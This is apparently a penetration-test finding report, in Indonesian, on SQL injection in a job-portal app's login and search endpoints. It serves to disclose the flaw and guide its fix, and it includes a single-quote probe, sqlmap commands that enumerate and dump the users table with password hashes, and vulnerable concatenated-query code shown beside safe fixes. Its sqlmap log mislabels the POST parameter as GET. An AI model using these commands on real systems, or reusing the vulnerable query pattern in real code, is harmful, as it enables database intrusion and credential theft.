# 🗃️ Finding: SQL Injection

> **Kerentanan:** SQL Injection — Pada parameter login dan search

---

## 1. Informasi Temuan

| Item | Detail |
|------|--------|
| **Severity** | 🔴 Critical |
| **Skor CVSS** | 9.3 |
| **Vektor CVSS** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-89 — Improper Neutralization of Special Elements used in an SQL Command |
| **OWASP** | A03:2021 – Injection |

---

## 2. Endpoint Terdampak

| Metode | Endpoint | Parameter |
|--------|----------|-----------|
| `POST` | `/api/auth/login` | `username`, `password` |
| `GET` | `/api/jobs/search?keyword=` | `keyword` |

---

## 3. Deskripsi

Aplikasi menerima masukan dari pengguna (misalnya pada form login atau kolom pencarian) dan langsung menggunakannya untuk mengambil data dari database **tanpa memeriksa atau membersihkan isi masukan tersebut terlebih dahulu**. Hal ini memungkinkan penyerang menyisipkan perintah database di dalam kolom input biasa, sehingga server menjalankan perintah tersebut seolah-olah merupakan bagian dari operasi normal aplikasi.

---

## 4. Dampak

Dengan memanfaatkan celah ini, **siapa pun dari internet** — tanpa perlu memiliki akun atau kata sandi — dapat membaca, mengubah, bahkan menghapus seluruh data yang tersimpan di database aplikasi. Berikut rincian dampaknya:

| Dampak | Penjelasan |
|--------|------------|
| **Masuk tanpa kata sandi** | Penyerang dapat melewati halaman login dan masuk sebagai pengguna atau administrator mana pun. |
| **Pencurian data** | Seluruh isi database dapat disalin, termasuk data pengguna, kata sandi, dan informasi sensitif lainnya. |
| **Pengubahan & penghapusan data** | Penyerang dapat mengubah atau menghapus data, yang berpotensi merusak operasional aplikasi. |
| **Pengambilalihan server** | Pada konfigurasi tertentu, penyerang dapat meningkatkan akses hingga menjalankan perintah langsung di sistem operasi server. |

---

## 5. Langkah Proof of Concept (PoC)

Berikut adalah langkah-langkah pembuktian kerentanan (Proof of Concept) yang dilakukan selama pengujian:

### Langkah 1 — Pengujian Manual & Identifikasi Pesan Kesalahan SQL

Pengujian diawali secara manual dengan memasukkan karakter khusus sintaks SQL, yaitu tanda kutip tunggal (`'`), ke dalam kolom masukan `username` pada endpoint autentikasi (`/api/auth/login`). 

Aplikasi merespons dengan menampilkan **pesan kesalahan internal database (MySQL syntax error)**. Hal ini mengonfirmasi dua hal penting:
1. Input pengguna digabungkan langsung ke dalam kueri SQL tanpa validasi.
2. Fitur *error handling* tidak dikonfigurasi dengan aman karena membocorkan detail teknis database ke publik.

**Permintaan HTTP (Request):**

```http
POST /api/auth/login HTTP/1.1
Host: jobportal.vulnapp.id
Content-Type: application/json

{
  "username": "'",
  "password": "testpassword"
}
```

**Jawaban Server (Response):**

```json
{
  "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1"
}
```

> 📸 **[Screenshot 1: Pesan kesalahan database MySQL yang muncul saat menginputkan tanda kutip tunggal pada form login]**

---

### Langkah 2 — Pengujian Otomatis Menggunakan SQLMap

Setelah kerentanan terkonfirmasi secara manual, pengujian dilanjutkan menggunakan perkakas otomatisation **SQLMap** untuk mengukur sejauh mana celah ini dapat dieksploitasi. 

Permintaan HTTP dari Langkah 1 disimpan ke dalam berkas `request.txt` dan dijadikan sebagai input untuk SQLMap dengan perintah sebagai berikut:

**Perintah Execution:**

```bash
sqlmap -r request.txt --batch --dbs
```

**Hasil Pemindaian SQLMap:**

SQLMap berhasil mengonfirmasi bahwa parameter `username` bersifat *injectable* dan berhasil mengidentifikasi jenis DBMS yang digunakan (MySQL), serta berhasil mendaftar seluruh nama database yang ada di server.

```text
[INFO] testing connection to the target URL
[INFO] testing NULL connection to the target URL
[INFO] heuristic (basic) test shows option 'username' might be injectable
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[INFO] GET parameter 'username' is 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] the back-end DBMS is MySQL
[INFO] fetching database names

available databases [3]:
[*] information_schema
[*] jobportal_db
[*] mysql
```

> 📸 **[Screenshot 2: Hasil pemindaian SQLMap yang menunjukkan parameter username bersifat injectable beserta daftar nama database yang ditemukan]**

---

### Langkah 3 — Ekstraksi Data dari Database (Data Dumping)

Sebagai bukti akhir bahwa isi database dapat diakses sepenuhnya, SQLMap dijalankan kembali untuk mendaftar tabel-tabel di dalam database `jobportal_db` serta mendump isi dari tabel pengguna (`users`).

**Perintah Ekstraksi Tabel & Data:**

```bash
# 1. Menampilkan daftar tabel pada database target
sqlmap -r request.txt --batch -D jobportal_db --tables

# 2. Mengambil (dump) seluruh isi data dari tabel 'users'
sqlmap -r request.txt --batch -D jobportal_db -T users --dump
```

**Hasil Ekstraksi Data:**

```text
Database: jobportal_db
[5 tables]
+---------------+
| users         |
| jobs          |
| applications  |
| companies     |
| sessions      |
+---------------+

Database: jobportal_db
Table: users
[3 entries]
+----+----------+----------------------------------+-------+
| id | username | password                         | role  |
+----+----------+----------------------------------+-------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin |
| 2  | user1    | e10adc3949ba59abbe56e057f20f883e | user  |
| 3  | user2    | 827ccb0eea8a706c4c34a16891f84e7b | user  |
+----+----------+----------------------------------+-------+
```

> 📸 **[Screenshot 3: Bukti data sensitif dari tabel users (termasuk hash password dan peran pengguna) berhasil diekstraksi dari database]**

---

## 6. Rekomendasi Perbaikan

### 👤 Ringkasan Rekomendasi (Untuk Manajemen / Awam)

Aplikasi perlu dipastikan **selalu memisahkan antara data masukan pengguna dan perintah database**. Hal ini dapat dicapai dengan memperbarui cara aplikasi berkomunikasi dengan database agar menggunakan metode standar yang aman (Prepared Statements), serta menyembunyikan pesan kesalahan teknis agar tidak memberi petunjuk kepada pihak yang tidak berhak.

---

### 🛠️ Panduan Implementasi Teknis (Untuk Tim Pengembang)

| No | Langkah | Tindakan Teknis |
|----|---------|-----------------|
| 1 | **Prepared Statements (Wajib)** | Gunakan *Parameterized Queries* atau *ORM* (seperti Sequelize, Prisma, Hibernate, Laravel Eloquent) untuk seluruh kueri database. Jangan pernah menggabungkan string (*string concatenation*) dengan input pengguna. |
| 2 | **Validasi & Sanitasi Input** | Validasi semua input pengguna di sisi server berdasarkan tipe data, panjang, dan format yang diharapkan. Tolak input yang mengandung karakter khusus yang tidak sesuai. |
| 3 | **Prinsip Hak Akses Minimum** | Batasi hak akun database yang digunakan aplikasi. Akun aplikasi tidak boleh memiliki akses `DROP`, `ALTER`, atau akses administrator database (`root`/`DBA`). |
| 4 | **Penyembunyian Pesan Error** | Jangan tampilkan pesan kesalahan database mentah ke pengguna. Tampilkan pesan kesalahan umum (misal: *"Terjadi kesalahan pada sistem, silakan coba lagi"*). |
| 5 | **Web Application Firewall (WAF)** | Pasang WAF sebagai lapisan pertahanan tambahan untuk memblokir pola serangan SQL Injection secara otomatis. |

#### Contoh Perbaikan Kode

```php
// ❌ SANGAT RENTAN — Input digabung langsung ke kueri SQL
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
$result = mysqli_query($conn, $query);

// ✅ AMAN — Menggunakan Prepared Statement (PDO)
$stmt = $pdo->prepare("SELECT id, username, role FROM users WHERE username = :username AND password = :password");
$stmt->execute([
    ':username' => $input_username,
    ':password' => $hashed_password
]);
$user = $stmt->fetch();
```

```javascript
// ❌ SANGAT RENTAN (Node.js)
const query = `SELECT * FROM users WHERE username = '${req.body.username}'`;

// ✅ AMAN (Node.js + MySQL2)
const [rows] = await db.execute(
  'SELECT id, username, role FROM users WHERE username = ? AND password = ?',
  [req.body.username, req.body.password]
);
```

---

## 7. Referensi

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89 — SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CVSS 4.0 Calculator](https://www.first.org/cvss/calculator/4.0)
- [SQLMap Official](https://sqlmap.org/)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)